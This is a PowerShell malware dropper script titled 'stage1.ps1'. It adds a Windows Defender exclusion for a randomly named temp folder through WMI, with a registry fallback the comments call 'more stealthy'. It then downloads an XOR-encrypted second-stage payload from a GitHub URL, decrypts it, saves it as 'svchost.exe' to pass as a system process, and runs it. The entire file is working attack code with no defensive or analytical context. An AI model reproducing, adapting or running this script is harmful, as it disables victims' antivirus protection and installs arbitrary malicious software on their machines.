# stage1.ps1 - Defender Exclusion + Stage2 Drop (Run AFTER patch.ps1)

# ---------- 1. Add Defender Exclusion via WMI (MSFT_MpPreference) ----------
$excludeDir = "$env:TEMP\WinCache_" + [System.IO.Path]::GetRandomFileName().Substring(0,8)
New-Item -ItemType Directory -Path $excludeDir -Force | Out-Null

try {
    Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Add -Arguments @{
        ExclusionPath = @($excludeDir)
    } -ErrorAction Stop | Out-Null
} catch {
    # Fallback: Group Policy registry key (more stealthy)
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    New-ItemProperty -Path $regPath -Name $excludeDir -Value 0 -PropertyType DWord -Force | Out-Null
}

# ---------- 2. Download, Decrypt, and Execute Stage2 ----------
$url = "https://raw.githubusercontent.com/beamer123q-svg/update-test/main/stage2.bin"
$key = [byte[]](0x5A,0x5B,0x5C,0x5D)

try {
    $bytes = (New-Object Net.WebClient).DownloadData($url)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
    }
    $stage2Path = Join-Path $excludeDir "svchost.exe"
    [System.IO.File]::WriteAllBytes($stage2Path, $bytes)
    Start-Process -FilePath $stage2Path
} catch {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show("STAGE1 FAILED: $_", "Test")
}
